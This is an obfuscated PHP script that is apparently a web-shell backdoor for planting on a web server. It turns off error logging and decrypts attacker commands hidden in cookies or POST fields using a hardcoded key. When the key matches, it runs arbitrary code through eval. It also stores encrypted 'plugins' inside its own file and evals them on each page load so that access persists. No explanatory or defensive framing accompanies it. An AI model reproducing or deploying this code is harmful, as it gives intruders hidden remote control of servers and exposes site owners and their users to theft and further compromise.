<?php

if (!defined('stream_context_create ')) {
    define('stream_context_create ', 1);
    @ini_set('error_log', NULL);
    @ini_set('log_errors', 0);
    @ini_set('max_execution_time', 0);
    @error_reporting(0);
    @set_time_limit(0);
    if (!defined("PHP_EOL")) {
        define("PHP_EOL", "\n");
    }
    if (!defined('file_put_contents ')) {
        define('file_put_contents ', 1);
        $hbmdain = '32d46a35-406e-436f-86e3-84de830d1470';
        global $hbmdain;
        function ptfsyn($kpymns)
        {
            if (strlen($kpymns) < 4) {
                return "";
            }
            $slqefd = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
            $evycrd = str_split($slqefd);
            $evycrd = array_flip($evycrd);
            $awgipc = 0;
            $yhdugmv = "";
            $kpymns = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $kpymns);
            do {
                $xmmtyzg = $evycrd[$kpymns[$awgipc++]];
                $awgipcfngcjnt = $evycrd[$kpymns[$awgipc++]];
                $awgipcnmkuol = $evycrd[$kpymns[$awgipc++]];
                $zmeejvrm = $evycrd[$kpymns[$awgipc++]];
                $kwwrnp = ($xmmtyzg << 2) | ($awgipcfngcjnt >> 4);
                $vpqwhck = (($awgipcfngcjnt & 15) << 4) | ($awgipcnmkuol >> 2);
                $cahxjngjatbbk = (($awgipcnmkuol & 3) << 6) | $zmeejvrm;
                $yhdugmv = $yhdugmv . chr($kwwrnp);
                if ($awgipcnmkuol != 64) {
                    $yhdugmv = $yhdugmv . chr($vpqwhck);
                }
                if ($zmeejvrm != 64) {
                    $yhdugmv = $yhdugmv . chr($cahxjngjatbbk);
                }
            } while ($awgipc < strlen($kpymns));
            return $yhdugmv;
        }
        if (!function_exists('file_put_contents')) {
            function file_put_contents($kivgzda, $yeziveap, $lgjgbs = False)
            {
                $ttmovan = $lgjgbs == 8 ? 'a' : 'w';
                $qqwllf = @fopen($kivgzda, $ttmovan);
                if ($qqwllf === False) {
                    return 0;
                } else {
                    if (is_array($yeziveap)) $yeziveap = implode($yeziveap);
                    $cujmnhxo = fwrite($qqwllf, $yeziveap);
                    fclose($qqwllf);
                    return $cujmnhxo;
                }
            }
        }
        if (!function_exists('file_get_contents')) {
            function file_get_contents($vyqthge)
            {
                $asfhjcqn = fopen($vyqthge, "r");
                $cxrtxv = fread($asfhjcqn, filesize($vyqthge));
                fclose($asfhjcqn);
                return $cxrtxv;
            }
        }
        function yfftykz()
        {
            return trim(preg_replace("/\(.*\$/", '', __FILE__));
        }
        function knfwhfu($hxmrixs, $xmeyzi)
        {
            $onnxixs = "";
            for ($awgipc = 0; $awgipc < strlen($hxmrixs);) {
                for ($cahxjn = 0; $cahxjn < strlen($xmeyzi) && $awgipc < strlen($hxmrixs); $cahxjn++, $awgipc++) {
                    $onnxixs .= chr(ord($hxmrixs[$awgipc]) ^ ord($xmeyzi[$cahxjn]));
                }
            }
            return $onnxixs;
        }
        function hdpptajd($hxmrixs, $xmeyzi)
        {
            global $hbmdain;
            return knfwhfu(knfwhfu($hxmrixs, $xmeyzi), $hbmdain);
        }
        function kvmuanfa($hxmrixs, $xmeyzi)
        {
            global $hbmdain;
            return knfwhfu(knfwhfu($hxmrixs, $hbmdain), $xmeyzi);
        }
        function ctphrfz()
        {
            $yeziveapymxny = @file_get_contents(yfftykz());
            $eegmges = strpos($yeziveapymxny, md5(yfftykz()));
            if ($eegmges !== FALSE) {
                $kitihydp = substr($yeziveapymxny, $eegmges + 32);
                $srnjxj = @unserialize(hdpptajd(rawurldecode($kitihydp), md5(yfftykz())));
            } else {
                $srnjxj = array();
            }
            return $srnjxj;
        }
        function ostsabc($srnjxj)
        {
            $awgipctgxtenp = rawurlencode(kvmuanfa(@serialize($srnjxj), md5(yfftykz())));
            $yeziveapymxny = @file_get_contents(yfftykz());
            $eegmges = strpos($yeziveapymxny, md5(yfftykz()));
            if ($eegmges !== FALSE) {
                $mncgavw = substr($yeziveapymxny, $eegmges + 32);
                $yeziveapymxny = str_replace($mncgavw, $awgipctgxtenp, $yeziveapymxny);
            } else {
                $yeziveapymxny = $yeziveapymxny . "\n\n//" . md5(yfftykz()) . $awgipctgxtenp;
            }
            @file_put_contents(yfftykz(), $yeziveapymxny);
        }
        function acimnftv($xnpcyapr, $groovcvn)
        {
            $srnjxj = ctphrfz();
            $srnjxj[$xnpcyapr] = ptfsyn($groovcvn);
            ostsabc($srnjxj);
        }
        function utofrn($xnpcyapr)
        {
            $srnjxj = ctphrfz();
            unset($srnjxj[$xnpcyapr]);
            ostsabc($srnjxj);
        }
        function vzdivada($xnpcyapr = NULL)
        {
            foreach (ctphrfz() as $kivgzdajzmzqiw => $vsibmavs) {
                if ($xnpcyapr) {
                    if (strcmp($xnpcyapr, $kivgzdajzmzqiw) == 0) {
                        eval($vsibmavs);
                        break;
                    }
                } else {
                    eval($vsibmavs);
                }
            }
        }
        foreach (array_merge($_COOKIE, $_POST) as $bmuvqsn => $hxmrixs) {
            $hxmrixs = @unserialize(hdpptajd(ptfsyn($hxmrixs), $bmuvqsn));
            if (isset($hxmrixs['ak']) && $hbmdain == $hxmrixs['ak']) {
                if ($hxmrixs['a'] == 'i') {
                    $awgipc = array('pv' => @phpversion(), 'sv' => '2.0-1', 'ak' => $hxmrixs['ak'],);
                    echo @serialize($awgipc);
                    exit;
                } elseif ($hxmrixs['a'] == 'e') {
                    eval($hxmrixs['d']);
                } elseif ($hxmrixs['a'] == 'plugin') {
                    if ($hxmrixs['sa'] == 'add') {
                        acimnftv($hxmrixs['p'], $hxmrixs['d']);
                    } elseif ($hxmrixs['sa'] == 'rem') {
                        utofrn($hxmrixs['p']);
                    }
                }
                echo $hxmrixs['ak'];
                exit();
            }
        }
        vzdivada();
    }
}
